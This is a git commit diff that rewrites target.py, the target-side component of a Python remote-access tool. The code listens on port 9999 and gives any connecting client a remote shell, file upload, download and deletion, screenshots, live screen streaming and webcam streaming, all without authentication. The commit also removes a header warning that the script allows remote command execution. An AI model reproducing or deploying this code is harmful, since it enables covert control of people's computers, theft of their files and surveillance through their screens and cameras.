21068a4f08541bc8e8abc70d9c442a4946e0f33b
Manohar Kakumani <42714264+manoharkakumani@users.noreply.github.com>
2024-03-02 04:09:31 -0500

    Update target.py

--- know_ip/target.py
+++ know_ip/target.py
@@ -1,7 +1,4 @@
 #copyright © 2019-2024 manoharkakumani
-# WARNING: This script allows remote execution of commands and access to system resources.
-# It should be used with caution and never in a production environment without proper security measures.
-
 import socket
 import os
 import subprocess
@@ -13,185 +10,211 @@ import cv2
 import numpy
 from PIL import ImageGrab
 
-# Global variables for socket connection
-host = ''
 port = 9999
-server_socket = None
 
-def create_server_socket():
-    """Create a server socket to listen for incoming connections."""
-    global server_socket
+# Create a Socket
+def create_socket():
     try:
-        server_socket = socket.socket()
+        global host
+        global s
+        host = ""
+        s = socket.socket()
     except socket.error as msg:
-        print("Socket creation error: " + str(msg))
+        create_socket()
 
-def bind_and_listen():
-    """Bind the socket to the host and port, and start listening for connections."""
+# Binding the socket and listening for connections
+def bind_socket():
     try:
-        global host, port, server_socket
-        server_socket.bind((host, port))
-        server_socket.listen(5)
+        global host
+        global port
+        global s
+        s.bind((host, port))
+        s.listen(5)
     except socket.error as msg:
-        print("Socket binding error: " + str(msg))
-        bind_and_listen()  # Retry binding
+           bind_socket()
 
-def execute_shell_command(command, connection):
-    """Execute shell commands received from the client."""
+#shell
+def shell(data,conn):
     try:
-        if command.startswith('cd'):
-            os.chdir(command[3:])
-        if len(command) > 0:
-            cmd_process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
-            output_bytes = cmd_process.stdout.read() + cmd_process.stderr.read()
-            output_str = str(output_bytes, "utf-8")
-            current_working_directory = os.getcwd() + "> "
-            connection.send(str.encode(output_str + current_working_directory))
+        if data[:2]== 'cd':
+            os.chdir(data[3:])
+        if len(data) > 0:
+            cmd = subprocess.Popen(data[:],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+            output_byte = cmd.stdout.read() + cmd.stderr.read()
+            output_str = str(output_byte,"utf-8")
+            currentWD = os.getcwd() + "> "
+            conn.send(str.encode(output_str + currentWD))
     except Exception as e:
-        connection.send(str(e).encode("utf-8"))
+        conn.send(e.encode("utf-8"))
 
-def take_screenshot(connection):
-    """Capture the current screen and send it to the client."""
-    screenshot = pyautogui.screenshot()
-    screenshot_file = 'screenshot.png'
-    screenshot.save(screenshot_file)
-    send_file(screenshot_file, connection)
-    os.remove(screenshot_file)
+#screenshot
+def sshot(conn):
+    try:
+        conn.send(('OK').encode("utf-8"))
+        pic = pyautogui.screenshot()
+        pic.save('myssdd.png')
+        fup('myssdd.png',conn)
+        os.unlink('myssdd.png')
+    except Exception as e:
+        conn.send(e.encode("utf-8"))
 
-def stream_screen(connection):
-    """Stream the screen to the client."""
-    while True:
-        command = connection.recv(4096).decode('utf-8')
-        if command == "stream":
-            frame = numpy.array(ImageGrab.grab())
-            result, frame = cv2.imencode('.jpg', frame)
-            data = pickle.dumps(frame, 0)
-            size = len(data)
-            connection.sendall(struct.pack(">L", size) + data)
-        else:
-            break
-
-def access_camera(connection):
-    """Access the camera and send the feed to the client."""
-    cam = cv2.VideoCapture(0)
-    if cam.isOpened():
+#screen_streaming
+def stream(conn): 
+    try: 
+        conn.send(('OK').encode("utf-8"))
         while True:
-            command = connection.recv(4096).decode('utf-8')
-            if command == "cam":
-                ret, frame = cam.read()
+            if conn.recv(4096).decode('utf-8')=="sst":
+                frame = numpy.array(ImageGrab.grab())
                 result, frame = cv2.imencode('.jpg', frame)
                 data = pickle.dumps(frame, 0)
-                connection.sendall(struct.pack(">L", len(data)) + data)
+                size = len(data)
+                conn.sendall(struct.pack(">L", size) + data)
             else:
-                cam.release()
                 break
-    else:
-        connection.send('No camera found'.encode("utf-8"))
-
-def list_files(connection):
-    """Send a list of files in the current directory to the client."""
-    file_list = pickle.dumps(os.listdir())
-    connection.send(file_list)
-
-def change_directory(connection):
-    """Change the current working directory based on client input."""
-    try:
-        connection.send((os.getcwd()).encode("utf-8"))
-        confirmation = connection.recv(1024).decode("utf-8")
-        if confirmation == 'Y':
-            new_directory = connection.recv(1024).decode("utf-8")
-            os.chdir(new_directory)
-            connection.send((os.getcwd()).encode("utf-8"))
+        return
     except Exception as e:
-        connection.send(str(e).encode("utf-8"))
+        conn.send(e.encode("utf-8"))
 
-def download_file_from_client(filename, connection):
-    """Receive a file from the client and save it locally."""
-    data = connection.recv(1024).decode("utf-8")
-    if data.startswith('EXISTS'):
-        filesize = int(data[6:])
-        connection.send("OK".encode("utf-8"))
-        with open(filename, 'wb') as f:
-            data = connection.recv(1024)
-            total_received = len(data)
-            f.write(data)
-            while total_received < filesize:
-                data = connection.recv(1024)
-                total_received += len(data)
-                f.write(data)
-
-def send_file(filename, connection):
-    """Send a file to the client."""
-    if os.path.isfile(filename):
-        connection.send(str.encode("EXISTS " + str(os.path.getsize(filename))))
-        filesize = int(os.path.getsize(filename))
-        user_response = connection.recv(1024).decode("utf-8")
-        if user_response[:2] == 'OK':
-            with open(filename, 'rb') as f:
-                bytes_to_send = f.read(1024)
-                connection.send(bytes_to_send)
-                total_sent = len(bytes_to_send)
-                while total_sent < filesize:
-                    bytes_to_send = f.read(1024)
-                    total_sent += len(bytes_to_send)
-                    connection.send(bytes_to_send)
-    else:
-        connection.send("ERROR".encode("utf-8"))
-
-def delete_file_or_directory(name, connection):
-    """Delete a file or directory based on client request."""
+#camera
+def cam(conn):
     try:
-        if os.path.isfile(name):
-            os.remove(name)
-        elif os.path.isdir(name):
-            shutil.rmtree(name)
-        connection.send("Success".encode("utf-8"))
-    except Exception as e:
-        connection.send(str(e).encode("utf-8"))
-
-def main_loop(connection):
-    """Main loop to handle commands from the client."""
-    while True:
-        data = connection.recv(1024).decode("utf-8").split('~')
-        command = data[0]
-        arg = data[1] if len(data) > 1 else None
-
-        if command == 'cmd':
-            execute_shell_command(arg, connection)
-        elif command == 'fdown':
-            send_file(arg, connection)
-        elif command == 'fup':
-            download_file_from_client(arg, connection)
-        elif command == 'cdir':
-            change_directory(connection)
-        elif command == 'flist':
-            list_files(connection)
-        elif command == 'fdel':
-            delete_file_or_directory(arg, connection)
-        elif command == 'sshot':
-            take_screenshot(connection)
-        elif command == 'cam':
-            access_camera(connection)
-        elif command == 'stream':
-            stream_screen(connection)
-        elif command == 'cwd':
-            connection.send((os.getcwd()).encode("utf-8"))
-        elif command in ['back', 'exit']:
-            connection.close()
-            return command
+        conn.send(('OK').encode("utf-8"))
+        cam = cv2.VideoCapture(0)
+        if cam :
+            conn.send(('cam').encode("utf-8"))
+            while True:
+                if conn.recv(4096).decode('utf-8')=="cam":
+                    ret, frame = cam.read()
+                    result, frame = cv2.imencode('.jpg', frame)
+                    data = pickle.dumps(frame,0)
+                    conn.sendall(struct.pack(">L", len(data)) + data)
+                else:
+                    cam.release()
+                    break
+            return
         else:
-            connection.send("Invalid command.".encode('utf-8'))
+            conn.send(('No camera Found').encode("utf-8"))
+    except Exception as e:
+        conn.send(e.encode("utf-8"))
 
-def accept_connections():
-    """Accept incoming connections and handle them."""
-    conn, address = server_socket.accept()
-    return main_loop(conn)
 
-# Initialize and run the server
-create_server_socket()
-bind_and_listen()
-while True:
-    if accept_connections() == "back":
-        continue
-    else:
-        break
+# send file list
+
+def flist(conn):
+    try:
+        arr = pickle.dumps(os.listdir())
+        conn.send(arr)
+    except:
+        conn.send(('Error').encode("utf-8"))
+
+# dir change
+
+def cdir(conn):
+    try:
+        conn.send((os.getcwd()).encode("utf-8"))
+        x=conn.recv(1024).decode("utf-8")
+        if x=='Y':
+           dire=conn.recv(1024).decode("utf-8")
+           os.chdir(dire)
+           conn.send((os.getcwd()).encode("utf-8"))
+        else:
+            return
+    except Exception as e:
+        conn.send(e.encode("utf-8"))
+
+#accept file from server
+
+def fdown(filename,conn):
+    try:
+        data = conn.recv(1024).decode("utf-8")
+        if data[:6] == 'EXISTS':
+            filesize = data[6:]
+            conn.send("OK".encode("utf-8"))
+            f = open(filename, 'wb')
+            data = (conn.recv(1024))
+            totalRecv = len(data)
+            f.write(data)
+            while int(totalRecv) < int(filesize):
+                data = conn.recv(1024)
+                totalRecv += len(data)
+                f.write(data)
+            f.close()
+    except Exception as e:
+        conn.send(e.encode("utf-8"))
+#send file
+
+def fup(filename, conn):
+    try:
+        if os.path.isfile(filename):
+            conn.send(str.encode("EXISTS " + str(os.path.getsize(filename))))
+            filesize=int(os.path.getsize(filename))
+            userResponse = conn.recv(1024).decode("utf-8")
+            if userResponse[:2] == 'OK':
+                with open(filename, 'rb') as f:
+                    bytesToSend = f.read(1024)
+                    conn.send(bytesToSend)
+                    totalSend=len(bytesToSend)
+                    while int (totalSend) < int(filesize):
+                        bytesToSend = f.read(1024)
+                        totalSend += len(bytesToSend)
+                        conn.send(bytesToSend)
+        else:
+            conn.send("ERROR".encode("utf-8"))
+    except Exception as e:
+        conn.send(e.encode("utf-8"))
+
+# delete files
+
+def fdel(fname,conn):
+    try:
+        if os.path.isfile(fname):
+            os.unlink(fname)
+        elif os.path.isdir(fname):
+            shutil.rmtree(fname)
+        else:
+            conn.send("ERROR".encode("utf-8"))
+        conn.send("Success".encode("utf-8"))
+    except Exception as e:
+        conn.send(e.encode("utf-8"))
+#main
+def main(s):
+    while True:
+        data = (s.recv(1024)).decode("utf-8").split('~')
+        if data[0]=='cmd':
+            shell(data[1],s)
+        elif data[0]=='fdown':
+            fup(data[1],s)
+        elif data[0]=='fup':
+            fdown(data[1],s)
+        elif data[0]=='cdir':
+            cdir(s)
+        elif data[0]=='flist':
+            flist(s)
+        elif data[0]=='fdel':
+            fdel(data[1],s)
+        elif data[0]=='sshot':
+            sshot(s)
+        elif data[0]=='cam':
+            cam(s)
+        elif data[0]=='sst':
+            stream(s)
+        elif data[0]=='cwd':
+            s.send((os.getcwd()).encode("utf-8"))
+        elif data[0]=='back':
+            s.close()
+            return "back"
+        elif data[0]=='exit':
+            s.close()
+            return "exit"
+        else:
+            s.send(".".encode('utf-8'))
+
+
+# Establish connection with a host (socket must be listening)
+
+def socket_accept():
+    conn, address = s.accept()
+    return main(conn)
+create_socket()
+bind_socket()
+while socket_accept()=="back":continue
